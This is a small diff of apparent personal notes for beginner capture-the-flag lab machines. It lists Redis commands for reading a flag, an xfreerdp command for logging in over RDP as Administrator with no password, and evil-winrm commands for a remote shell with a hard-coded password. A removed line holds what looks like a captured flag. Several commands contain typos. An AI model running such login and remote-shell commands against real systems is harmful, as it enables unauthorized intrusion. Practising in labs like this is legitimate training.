@@ -17,9 +17,13 @@ info
 keys *  
 get Flag  
 
-$ TIER 1
+### Explosion
+RDP as Administrator, no password  
+xfreerdp /v:Administrator /cert:ignore /v:{IP-addess}  
+
+# TIER 1
 
 ###  
-sudo get install evil-winrm
-evit-winrm -u Administrator -p badminton -i {IP-address}
-951fa96d7830c451b536be
+sudo get install evil-winrm  
+evit-winrm -u Administrator -p badminton -i {IP-address}  
+
